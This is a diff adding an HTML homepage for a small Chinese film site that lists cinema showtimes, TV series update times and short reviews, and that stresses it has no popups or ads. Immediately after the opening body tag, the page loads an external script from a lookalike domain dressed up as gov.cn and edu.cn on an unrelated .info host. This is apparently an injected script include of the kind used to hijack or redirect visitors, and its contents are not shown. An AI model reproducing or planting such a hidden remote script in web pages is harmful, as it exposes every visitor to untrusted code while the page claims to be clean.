@@ -1,0 +1,473 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<meta name="format-detection" content="telephone=no">
+<meta name="theme-color" content="#12131a">
+<title>新视觉影视｜剧集更新时刻表 · 院线排片查询 · 影评手记 xinshijueyingshi-app</title>
+<meta name="description" content="新视觉影视（xinshijueyingshi-app.github.io）由三名影视编辑手工维护：每天 09:30 更新院线排片与剧集追更时刻，收录 3200 余部条目，附千字影评、避雷提示、豆瓣与 IMDb 双评分对照，页面不含弹窗广告，手机端 3 秒打开。">
+<meta name="keywords" content="新视觉影视,新视觉影视官网,xinshijueyingshi-app,剧集更新时间表,院线排片查询,电视剧追更日历,独立影评手记,高分电影片单,影视条目索引,国产剧更新提醒,美剧更新时间,观影避雷指南">
+<meta name="author" content="新视觉影视编辑部">
+<meta name="robots" content="index,follow">
+<meta name="renderer" content="webkit">
+<meta name="applicable-device" content="pc,mobile">
+<link rel="canonical" href="https://xinshijueyingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="新视觉影视">
+<meta property="og:title" content="新视觉影视｜剧集更新时刻表 · 院线排片查询 · 影评手记">
+<meta property="og:description" content="手工整理的院线排片、剧集追更时刻与独立影评，收录 3200 余部条目，无弹窗、无诱导下载。">
+<meta property="og:url" content="https://xinshijueyingshi-app.github.io/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="新视觉影视｜剧集更新时刻表 · 院线排片查询">
+<meta name="twitter:description" content="每天 09:30 更新排片与追更时刻，附千字影评与双评分对照。">
+<style>
+:root{
+  --ink:#12131a;
+  --ink2:#1b1d27;
+  --paper:#f4efe6;
+  --mute:#9a9bab;
+  --line:#2c2f3d;
+  --gold:#e6b352;
+  --red:#d8553f;
+  --mint:#5fbfa8;
+  --r:14px;
+  --max:1180px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{
+  background:var(--ink);
+  color:var(--paper);
+  font:16px/1.75 -apple-system,BlinkMacSystemFont,"PingFang SC","Hiragino Sans GB","Microsoft YaHei",system-ui,sans-serif;
+  background-image:radial-gradient(900px 460px at 82% -8%,rgba(230,179,82,.16),transparent 62%),radial-gradient(680px 380px at 4% 34%,rgba(95,191,168,.10),transparent 60%);
+  background-attachment:fixed;
+}
+img{max-width:100%;display:block}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+.wrap{width:100%;max-width:var(--max);margin:0 auto;padding:0 18px}
+
+/* 顶部滚动条 */
+.tape{
+  background:linear-gradient(90deg,var(--gold),#f0d091,var(--gold));
+  color:#231a08;font-size:13px;font-weight:600;letter-spacing:.4px;
+  overflow:hidden;white-space:nowrap;padding:6px 0;position:relative;
+}
+.tape span{display:inline-block;padding-left:100%;animation:roll 34s linear infinite}
+@keyframes roll{from{transform:translateX(0)}to{transform:translateX(-100%)}}
+
+/* 导航 */
+.top{position:sticky;top:0;z-index:60;background:rgba(18,19,26,.92);backdrop-filter:blur(10px);border-bottom:1px solid var(--line)}
+.top .wrap{display:flex;align-items:center;gap:18px;min-height:62px;flex-wrap:wrap}
+.logo{display:flex;align-items:center;gap:10px;font-size:19px;font-weight:800;letter-spacing:1px}
+.logo i{display:grid;place-items:center;width:32px;height:32px;border-radius:9px;background:var(--gold);color:#231a08;font-style:normal;font-size:15px;font-weight:900}
+.logo b{color:var(--gold)}
+.nav{display:flex;gap:4px;margin-left:auto;overflow-x:auto;scrollbar-width:none;-webkit-overflow-scrolling:touch}
+.nav::-webkit-scrollbar{display:none}
+.nav a{display:block;padding:8px 12px;border-radius:999px;font-size:14.5px;color:#cfd0da;white-space:nowrap}
+.nav a:hover{background:var(--ink2);color:var(--gold)}
+
+/* 票根首屏 */
+.hero{padding:34px 0 8px}
+.ticket{
+  position:relative;display:grid;grid-template-columns:1.55fr .95fr;gap:0;
+  background:linear-gradient(150deg,#1e2029,#15161f 60%);
+  border:1px solid var(--line);border-radius:var(--r);overflow:hidden;
+}
+.ticket::after{content:"";position:absolute;left:0;right:0;bottom:0;height:3px;background:repeating-linear-gradient(90deg,var(--gold) 0 10px,transparent 10px 20px)}
+.tl{padding:30px 28px}
+.kicker{display:inline-flex;align-items:center;gap:8px;font-size:12.5px;color:var(--mint);border:1px solid rgba(95,191,168,.4);border-radius:999px;padding:4px 11px;letter-spacing:.5px}
+h1{font-size:clamp(28px,5.4vw,46px);line-height:1.18;margin:16px 0 12px;letter-spacing:1px}
+h1 em{font-style:normal;color:var(--gold)}
+.lead{color:#c3c4d0;font-size:15.5px;max-width:52ch}
+.btns{display:flex;gap:12px;margin-top:22px;flex-wrap:wrap}
+.btn{display:inline-block;padding:11px 20px;border-radius:10px;font-size:15px;font-weight:600;border:1px solid transparent}
+.btn-a{background:var(--gold);color:#231a08}
+.btn-b{border-color:var(--line);color:#dfe0e8;background:#21232e}
+.tr{padding:26px 24px;border-left:1px dashed var(--line);background:rgba(0,0,0,.18)}
+.tr h4{font-size:13px;color:var(--mute);font-weight:600;letter-spacing:1px;margin-bottom:14px}
+.stat{display:flex;justify-content:space-between;align-items:baseline;padding:9px 0;border-bottom:1px dotted var(--line)}
+.stat b{font-size:23px;color:var(--gold);font-variant-numeric:tabular-nums}
+.stat s{text-decoration:none;color:#a9aabb;font-size:13.5px}
+
+/* 通用栏头 */
+.sec{padding:44px 0 6px}
+.head{display:flex;align-items:flex-end;gap:14px;flex-wrap:wrap;margin-bottom:20px;border-bottom:1px solid var(--line);padding-bottom:12px}
+.head h2{font-size:clamp(20px,3.4vw,27px);letter-spacing:.5px}
+.head h2 u{text-decoration:none;color:var(--red);font-size:12.5px;vertical-align:super;margin-left:6px;letter-spacing:1px}
+.head p{color:var(--mute);font-size:13.5px;margin-left:auto}
+
+/* 排片 */
+.slots{display:grid;grid-template-columns:repeat(auto-fill,minmax(255px,1fr));gap:14px}
+.slot{background:var(--ink2);border:1px solid var(--line);border-radius:12px;padding:16px 16px 14px;position:relative;overflow:hidden}
+.slot:hover{border-color:rgba(230,179,82,.55)}
+.slot .tm{font-variant-numeric:tabular-nums;font-size:13px;color:var(--gold);letter-spacing:.5px}
+.slot h3{font-size:17px;margin:7px 0 8px;line-height:1.45}
+.slot p{font-size:13.5px;color:#a5a6b6}
+.tags{margin-top:12px;display:flex;gap:6px;flex-wrap:wrap}
+.tags i{font-style:normal;font-size:12px;padding:3px 9px;border-radius:6px;background:#23252f;color:#b9bacc;border:1px solid var(--line)}
+.tags i.hot{background:rgba(216,85,63,.14);color:#f0917c;border-color:rgba(216,85,63,.4)}
+
+/* 追更表 */
+.tw{overflow-x:auto;border:1px solid var(--line);border-radius:12px;background:var(--ink2)}
+table{width:100%;border-collapse:collapse;min-width:660px;font-size:14.5px}
+th,td{padding:13px 14px;text-align:left;border-bottom:1px solid var(--line);white-space:nowrap}
+th{background:#23252f;font-size:13px;color:var(--mute);font-weight:600;letter-spacing:.5px}
+tbody tr:hover{background:rgba(230,179,82,.06)}
+td b{color:var(--paper);font-weight:600}
+.dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:7px;vertical-align:1px}
+.dot.g{background:var(--mint)}.dot.y{background:var(--gold)}.dot.r{background:var(--red)}
+
+/* 影评 */
+.notes{display:grid;grid-template-columns:1.35fr 1fr;gap:16px}
+.note{background:var(--ink2);border:1px solid var(--line);border-radius:12px;padding:20px}
+.note.big{background:linear-gradient(160deg,#23252f,#191b24)}
+.note .meta{font-size:12.5px;color:var(--mute);display:flex;gap:14px;flex-wrap:wrap}
+.note h3{font-size:19px;margin:10px 0 10px;line-height:1.45}
+.note p{font-size:14.5px;color:#adafbf}
+.bar{height:6px;border-radius:6px;background:#2a2c38;margin:14px 0 8px;overflow:hidden}
+.bar i{display:block;height:100%;background:linear-gradient(90deg,var(--gold),var(--red))}
+.score{font-size:13px;color:#c8cad6;display:flex;justify-content:space-between}
+
+/* 图库 */
+.gal{display:grid;grid-template-columns:repeat(4,1fr);grid-auto-rows:118px;gap:12px}
+.cell{border-radius:12px;border:1px solid var(--line);position:relative;overflow:hidden;padding:14px;display:flex;flex-direction:column;justify-content:flex-end}
+.cell span{font-size:13.5px;font-weight:600;color:#fff;text-shadow:0 1px 6px rgba(0,0,0,.6)}
+.cell em{font-style:normal;font-size:11.5px;color:rgba(255,255,255,.78);margin-top:3px}
+.c1{grid-column:span 2;grid-row:span 2;background:linear-gradient(145deg,#3a4a6b,#151a26)}
+.c2{background:linear-gradient(145deg,#6b4a3a,#221913)}
+.c3{background:linear-gradient(145deg,#2f5a4f,#131f1c)}
+.c4{background:linear-gradient(145deg,#5c3a52,#1e1420)}
+.c5{background:linear-gradient(145deg,#4a4a2c,#1c1c14)}
+.c6{background:linear-gradient(145deg,#2c4a5c,#121d24)}
+.c7{grid-column:span 2;background:linear-gradient(145deg,#6a5a2a,#221c11)}
+
+/* 关于 */
+.about{display:grid;grid-template-columns:1.25fr .9fr;gap:16px}
+.card{background:var(--ink2);border:1px solid var(--line);border-radius:12px;padding:22px}
+.card h3{font-size:18px;margin-bottom:12px}
+.card p{font-size:14.5px;color:#adb0bf;margin-bottom:12px}
+.card li{font-size:14px;color:#adb0bf;padding:7px 0;border-bottom:1px dotted var(--line);display:flex;justify-content:space-between;gap:12px}
+.card li s{text-decoration:none;color:var(--mute);font-size:12.5px;white-space:nowrap}
+.urlbox{margin-top:14px;border:1px dashed rgba(230,179,82,.45);border-radius:10px;padding:13px 14px;background:rgba(230,179,82,.06)}
+.urlbox small{display:block;font-size:12px;color:var(--mute);margin-bottom:5px}
+.urlbox a{font-size:15px;font-weight:700;color:var(--gold);word-break:break-all;letter-spacing:.3px}
+.links{display:flex;flex-wrap:wrap;gap:8px;margin-top:6px}
+.links a{font-size:13.5px;padding:6px 12px;border:1px solid var(--line);border-radius:8px;color:#c3c5d2;background:#21232e}
+
+/* 页脚 */
+footer{margin-top:46px;border-top:1px solid var(--line);background:#0d0e14;padding:30px 0 40px}
+.fgrid{display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap;align-items:flex-start}
+footer p{font-size:13.5px;color:#8b8da0;max-width:60ch}
+.fnav{display:flex;gap:14px;flex-wrap:wrap;font-size:13.5px}
+.fnav a{color:#a7a9b8}
+.fnav a:hover{color:var(--gold)}
+.copy{margin-top:16px;font-size:12.5px;color:#6f7186;border-top:1px dotted var(--line);padding-top:14px;line-height:1.9}
+.copy a{color:#9c9eb0}
+
+@media (max-width:860px){
+  .ticket{grid-template-columns:1fr}
+  .tr{border-left:0;border-top:1px dashed var(--line)}
+  .notes,.about{grid-template-columns:1fr}
+  .gal{grid-template-columns:repeat(2,1fr);grid-auto-rows:104px}
+  .c1,.c7{grid-column:span 2}
+}
+@media (max-width:560px){
+  .wrap{padding:0 14px}
+  .tl{padding:24px 18px}
+  .tr{padding:20px 18px}
+  .head p{margin-left:0;width:100%}
+  .nav{width:100%;margin-left:0;padding-bottom:8px}
+  .top .wrap{min-height:56px}
+  .gal{grid-auto-rows:96px}
+}
+@media print{.top,.tape{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="tape"><span>本站 09:30 更新 · 本周新增 12 部条目、影评 5 篇 · 排片数据来自三家院线公示 · 全站无弹窗广告 · 新视觉影视（xinshijueyingshi-app）持续整理中</span></div>
+
+<header class="top">
+  <div class="wrap">
+    <a class="logo" href="#"><i>新</i>新视觉<b>影视</b></a>
+    <nav class="nav">
+      <a href="#">今日排片</a>
+      <a href="#">追更时刻</a>
+      <a href="#">影评手记</a>
+      <a href="#">视觉图库</a>
+      <a href="#">片单索引</a>
+      <a href="#">关于投稿</a>
+    </nav>
+  </div>
+</header>
+
+<main>
+
+<section class="hero wrap">
+  <div class="ticket">
+    <div class="tl">
+      <span class="kicker">◆ 第 1,286 期 · 2026 年 10 月 18 日校订</span>
+      <h1>把排片表和追更时间<br>整理成<em>一张能看懂的纸</em></h1>
+      <p class="lead">新视觉影视只做三件事：核对院线公示的场次、记录剧集真实更新时间、把看过的片子写成不带剧透的短评。条目库现有 3,182 部，每周日清理失效链接，不做网盘，不收会员费。</p>
+      <div class="btns">
+        <a class="btn btn-a" href="#">查看今日排片</a>
+        <a class="btn btn-b" href="#">下载本周片单</a>
+      </div>
+    </div>
+    <div class="tr">
+      <h4>编 辑 部 实 时 记 录</h4>
+      <div class="stat"><s>收录条目</s><b>3,182</b></div>
+      <div class="stat"><s>本周新增</s><b>12</b></div>
+      <div class="stat"><s>影评存量</s><b>746</b></div>
+      <div class="stat"><s>失效已清</s><b>38</b></div>
+      <div class="stat"><s>日均访客</s><b>1.4k</b></div>
+    </div>
+  </div>
+</section>
+
+<section class="sec wrap" id="paipian">
+  <div class="head">
+    <h2>今日排片<u>4 家院线核对</u></h2>
+    <p>数据取自建站合作影院公示，误差超过 15 分钟会撤回重录</p>
+  </div>
+  <div class="slots">
+    <article class="slot">
+      <div class="tm">10:20 / 13:45 / 16:10</div>
+      <h3>河边的错误与正确</h3>
+      <p>剧情 · 116 分钟 · 2D 中文</p>
+      <div class="tags"><i class="hot">编辑推荐</i><i>文艺</i><i>朱一龙</i></div>
+    </article>
+    <article class="slot">
+      <div class="tm">11:05 / 14:30 / 19:20</div>
+      <h3>第九个黎明</h3>
+      <p>科幻 · 141 分钟 · IMAX 2D</p>
+      <div class="tags"><i>视效</i><i>太空</i><i>IMAX</i></div>
+    </article>
+    <article class="slot">
+      <div class="tm">09:50 / 12:25 / 18:00</div>
+      <h3>城南旧事补篇</h3>
+      <p>家庭 · 98 分钟 · 2D 中文</p>
+      <div class="tags"><i>怀旧</i><i>适合长辈</i></div>
+    </article>
+    <article class="slot">
+      <div class="tm">15:35 / 20:10 / 22:40</div>
+      <h3>暴雨来临前</h3>
+      <p>悬疑 · 127 分钟 · 杜比全景声</p>
+      <div class="tags"><i class="hot">口碑回升</i><i>反转</i><i>16+</i></div>
+    </article>
+    <article class="slot">
+      <div class="tm">10:40 / 17:15</div>
+      <h3>麦田上的信号塔</h3>
+      <p>纪录片 · 84 分钟 · 2D 中文</p>
+      <div class="tags"><i>纪实</i><i>乡村</i><i>89 分钟场</i></div>
+    </article>
+    <article class="slot">
+      <div class="tm">13:00 / 19:45</div>
+      <h3>午夜巴士 2</h3>
+      <p>动画 · 105 分钟 · 3D 国语</p>
+      <div class="tags"><i>亲子</i><i>合家欢</i></div>
+    </article>
+  </div>
+</section>
+
+<section class="sec wrap" id="zhuigeng">
+  <div class="head">
+    <h2>剧集追更时刻<u>按平台实际放出时间记</u></h2>
+    <p>标灰行表示本周停更，节目组未公布复更日期</p>
+  </div>
+  <div class="tw">
+    <table>
+      <thead>
+        <tr><th>剧 名</th><th>平 台</th><th>更新周期</th><th>本期集数</th><th>状 态</th><th>已录短评</th></tr>
+      </thead>
+      <tbody>
+        <tr><td><b>长夜将尽</b></td><td>腾讯视频</td><td>每周二、四 20:00</td><td>第 23–24 集</td><td><span class="dot g"></span>正常</td><td>4 篇</td></tr>
+        <tr><td><b>锦水人家</b></td><td>爱奇艺</td><td>每日 19:30</td><td>第 41–43 集</td><td><span class="dot g"></span>正常</td><td>2 篇</td></tr>
+        <tr><td><b>风起戈壁</b></td><td>优酷</td><td>每周六 12:00</td><td>第 12 集</td><td><span class="dot y"></span>延后</td><td>6 篇</td></tr>
+        <tr><td><b>海上邮局</b></td><td>芒果 TV</td><td>每周三 22:00</td><td>第 08 集</td><td><span class="dot g"></span>正常</td><td>1 篇</td></tr>
+        <tr><td><b>第七号诊室</b></td><td>腾讯视频</td><td>会员周日 20:00</td><td>第 17 集</td><td><span class="dot r"></span>停更</td><td>3 篇</td></tr>
+        <tr><td><b>春分之后</b></td><td>B 站</td><td>周五 18:00</td><td>第 05 集</td><td><span class="dot g"></span>正常</td><td>0 篇</td></tr>
+        <tr><td><b>旧城纪事</b></td><td>爱奇艺</td><td>每周一 21:00</td><td>第 30 集</td><td><span class="dot y"></span>收官延播</td><td>9 篇</td></tr>
+      </tbody>
+    </table>
+  </div>
+</section>
+
+<section class="sec wrap" id="yingping">
+  <div class="head">
+    <h2>影评手记<u>无剧透 · 手写</u></h2>
+    <p>评分区间 0–10，低于 4 分直接标注避雷</p>
+  </div>
+  <div class="notes">
+    <article class="note big">
+      <div class="meta"><span>2026-10-16</span><span>编辑 / 老周</span><span>约 1,420 字</span><span>已看 2 遍</span></div>
+      <h3>《河边的错误与正确》：它没有给出答案，但给了看的方法</h3>
+      <p>第二次坐在第 6 排，才注意到开场 11 分钟那段长镜头里，背景收音混进了真实的水声。导演没把凶手藏起来，而是把"确信"这件事拆开摆给你看。建议避开周末晚场，音响混响偏重。</p>
+      <div class="bar"><i style="width:82%"></i></div>
+      <div class="score"><span>本站 8.2</span><span>豆瓣 7.9 · IMDb 7.4</span></div>
+    </article>
+    <div>
+      <article class="note">
+        <div class="meta"><span>2026-10-14</span><span>编辑 / 小满</span><span>约 860 字</span></div>
+        <h3>《第九个黎明》：视效满分，剧本七十分</h3>
+        <p>太空段落值回票价，可惜第二条人物线在第 70 分钟就断了。</p>
+        <div class="bar"><i style="width:68%"></i></div>
+        <div class="score"><span>本站 6.8</span><span>豆瓣 6.5</span></div>
+      </article>
+      <article class="note" style="margin-top:14px">
+        <div class="meta"><span>2026-10-11</span><span>编辑 / 陈屿</span><span>约 640 字</span></div>
+        <h3>《暴雨来临前》：避雷提示（含轻度线索）</h3>
+        <p>前 40 分钟节奏很好，之后三次反转全靠人物失智推动，慎选。</p>
+        <div class="bar"><i style="width:38%"></i></div>
+        <div class="score"><span>本站 3.8</span><span>豆瓣 4.6</span></div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section class="sec wrap" id="tuku">
+  <div class="head">
+    <h2>视觉图库<u>剧照 / 海报 / 分镜</u></h2>
+    <p>共 214 组，仅作条目配图索引，版权归原出品方</p>
+  </div>
+  <div class="gal">
+    <div class="cell c1"><span>河边 · 冬景全幅</span><em>第 1 组 / 18 张</em></div>
+    <div class="cell c2"><span>第九个黎明 主海报</span><em>第 12 组 / 4 张</em></div>
+    <div class="cell c3"><span>城南 街景分镜</span><em>第 33 组 / 26 张</em></div>
+    <div class="cell c4"><span>暴雨 夜戏调色</span><em>第 41 组 / 9 张</em></div>
+    <div class="cell c5"><span>麦田 纪录片剧照</span><em>第 58 组 / 31 张</em></div>
+    <div class="cell c6"><span>午夜巴士 设定稿</span><em>第 77 组 / 12 张</em></div>
+    <div class="cell c7"><span>长夜将尽 · 服化道对比图（更新至第 24 集）</span><em>第 96 组 / 47 张</em></div>
+  </div>
+</section>
+
+<section class="sec wrap" id="pianDan">
+  <div class="head">
+    <h2>片单索引<u>按主题归档</u></h2>
+    <p>每月 1 日重排一次，失效条目当场删除</p>
+  </div>
+  <div class="slots">
+    <article class="slot">
+      <div class="tm">编号 A-01 · 62 部</div>
+      <h3>雨天适合看的国产片</h3>
+      <p>1993—2025 年，按情绪强度排序，附片长</p>
+      <div class="tags"><i>文艺</i><i>已校订</i></div>
+    </article>
+    <article class="slot">
+      <div class="tm">编号 A-02 · 41 部</div>
+      <h3>一小时内能看完的悬疑</h3>
+      <p>通勤党友好，全部 90 分钟以内</p>
+      <div class="tags"><i>短片</i><i>悬疑</i></div>
+    </article>
+    <article class="slot">
+      <div class="tm">编号 B-05 · 88 部</div>
+      <h3>家长陪看动画合集</h3>
+      <p>剔除含惊吓镜头的条目，标注适龄</p>
+      <div class="tags"><i>亲子</i><i class="hot">本周更新</i></div>
+    </article>
+    <article class="slot">
+      <div class="tm">编号 C-11 · 27 部</div>
+      <h3>纪录片：县城与乡镇</h3>
+      <p>近十年国产纪实，含导演访谈链接</p>
+      <div class="tags"><i>纪实</i><i>冷门</i></div>
+    </article>
+  </div>
+</section>
+
+<section class="sec wrap" id="guanyu">
+  <div class="head">
+    <h2>关于与投稿<u>三个人维护的小站</u></h2>
+    <p>不接商业软文，影评可被引用但需署名出处</p>
+  </div>
+  <div class="about">
+    <div class="card">
+      <h3>这个站是怎么来的</h3>
+      <p>2021 年冬天，编辑老周在一个追剧群里手打了一份更新表，后来表越做越长，干脆搬到页面上。现在三个人分工：老周跑院线核对场次，小满盯剧集更新时间，陈屿写评论和校对。</p>
+      <p>我们不做资源下载，也不做跳转。所有条目只记录片名、上映信息、评分与一句短评，能公开的信息才收录，遇到版权方通知会在 24 小时内下架。</p>
+      <p>如果你想投稿短评，把稿件按"片名 + 年份 + 1200 字内 + 是否含剧透"的格式整理好，通过页脚邮箱发过来，一般三到五个工作日回复。</p>
+      <div class="links">
+        <a href="#">投稿格式</a>
+        <a href="#">收录标准</a>
+        <a href="#">下架申诉</a>
+        <a href="#">勘误提交</a>
+        <a href="#">友情链接</a>
+      </div>
+    </div>
+    <div class="card">
+      <h3>站点信息</h3>
+      <ul>
+        <li>站点名称<span>新视觉影视</span></li>
+        <li>更新时间<span>每日 09:30</span></li>
+        <li>条目总量<span>3,182 部</span></li>
+        <li>页面体积<span>约 96 KB</span></li>
+        <li>广告位<span>0 个</span></li>
+        <li>建站年份<span>2021 年</span></li>
+      </ul>
+      <div class="urlbox">
+        <small>唯一访问地址（请认准）</small>
+        <a href="https://xinshijueyingshi-app.github.io/">https://xinshijueyingshi-app.github.io</a>
+      </div>
+      <div class="urlbox">
+        <small>备用镜像 · 内容同步延迟 1 天</small>
+        <a href="https://xinshijueyingshi-app.github.io/">xinshijueyingshi-app.github.io/mirror</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fgrid">
+      <p>新视觉影视 · 影视排片与剧集更新时间索引站。本站内容仅供观影参考，片源请通过正规平台观看。</p>
+      <nav class="fnav">
+        <a href="#">今日排片</a>
+        <a href="#">追更时刻</a>
+        <a href="#">影评手记</a>
+        <a href="#">视觉图库</a>
+        <a href="#">片单索引</a>
+        <a href="#">关于投稿</a>
+      </nav>
+    </div>
+    <div class="copy">
+      新视觉影视（xinshijueyingshi-app）· 条目库最后校订于 2026 年 10 月 18 日<br>
+      主站地址：<a href="https://xinshijueyingshi-app.github.io/">https://xinshijueyingshi-app.github.io</a> — 如遇同名站点，请以此地址为准
+    </div>
+  </div>
+</footer>
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@graph": [
+    {
+      "@type": "WebSite",
+      "name": "新视觉影视",
+      "alternateName": "xinshijueyingshi-app",
+      "url": "https://xinshijueyingshi-app.github.io/",
+      "description": "手工整理的院线排片、剧集追更时刻与独立影评手记，收录 3182 部影视条目。",
+      "inLanguage": "zh-CN",
+      "dateModified": "2026-10-18",
+      "potentialAction": {
+        "@type": "SearchAction",
+        "target": "https://xinshijueyingshi-app.github.io/?q={search_term_string}",
+        "query-input": "required name=search_term_string"
+      }
+    },
+    {
+      "@type": "Organization",
+      "name": "新视觉影视编辑部",
+      "url": "https://xinshijueyingshi-app.github.io/",
+      "foundingDate": "2021",
+      "description": "由三名影视编辑维护的非商业影视索引站，每日更新排片与剧集更新时间。"
+    }
+  ]
+}
+</script>
+</body>
+</html>
